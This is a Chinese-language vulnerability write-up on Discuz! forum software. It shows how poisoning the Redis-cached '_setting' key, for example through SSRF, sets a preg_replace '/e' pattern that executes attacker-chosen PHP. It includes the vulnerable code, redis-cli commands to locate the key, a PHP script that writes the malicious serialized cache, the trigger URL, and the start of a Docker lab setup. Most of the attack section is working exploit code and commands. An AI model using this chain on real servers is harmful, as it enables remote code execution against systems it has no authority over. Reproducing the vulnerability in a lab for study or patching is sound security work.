# Discuz!利用SSRF+Redis缓存应用导致有条件代码执行
## 0x00漏洞简介
当dz设置使用缓存后，初始化时会把缓存内容加入全局变量$_G.而在调用缓存的地方source/fucntion/function_core.php中:
```
function output_replace($content) {
        ...
        if(...){
        ....
        $content = preg_replace($_G['setting']['output']['preg']['search'], $_G['setting']['output']['preg']['replace'],$content);
        }
        return $content;
}
```
其中，关键点的两个变量我们都可以通过redis修改:
```
$_G['setting']['output']['preg']['search']=”/.*/e”;
$_G['setting']['output']['preg']['replace']=”phpinfo();”;
```
dz使用redis时，全局变量$_G[‘setting’]放在xxxx_setting中的，其中前缀就是前面config_global.php中的prefix的值.也可以在redis-cli中通过如下命令查看：
```
keys *          #查看所有键
keys *_setting  #模糊查询的方式查找匹配的键
```
得到键名后通过以下方式修改本地缓存：
```
<?php
$a['output']['preg']['search']['plugins'] = "/.*/e";
$a['output']['preg']['replace']['plugins'] = "phpinfo();";
$a['rewritestatus']['plugins']=1;
$setting = serialize($a);
$redis = new Redis();
$redis->connect('127.0.0.1',6379);
$redis->set("kQbXlj_setting",$setting);
?>
```
复写缓存后访问如下地址就能发现成功getshell:
```
/discuz/forum.php?mod=ajax&inajax=yes&action=getthreadtype
```
## 0x01环境搭建
###获取镜像
环境搭建共使用三个镜像：MySQL、Redis和安装过phpredis的Discuz!
其中MySQL和Redis的镜像可用以下命令从官方获取：
```
docker pull mysql
docker pull redis
```
鉴于国外源的镜像仓库速度缓慢且有时容易中断无响应，建立通过[DaoCloud](https://www.daocloud.io/)拉取镜像
